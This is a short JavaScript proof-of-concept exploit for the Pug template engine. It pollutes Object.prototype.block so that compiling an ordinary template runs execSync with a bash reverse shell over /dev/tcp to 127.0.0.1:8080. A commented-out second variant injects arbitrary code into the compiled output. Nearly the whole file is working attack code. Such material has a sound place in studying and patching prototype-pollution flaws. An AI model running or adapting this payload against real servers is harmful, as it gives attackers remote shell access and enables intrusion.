pug = require("pug")

/* Payload Injection*/
// inject property to root prototype

// exp-1
Object.prototype.block = {
    type: "Text",
    line: "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/127.0.0.1/8080 0>&1'`)"
}

// exp-2
// Object.prototype['block'] = { 
//     type: "Code",
//     val: "console.log('code injection!!!')",
//     block: { // this block is used to stop the infinite loop after we polluted the block property
//         type: "Comment",
//         val: "End the visiting node process"
//   }
// }


const template = pug.compile(`h1= msg`);
console.log(template({msg: "Hello World"}));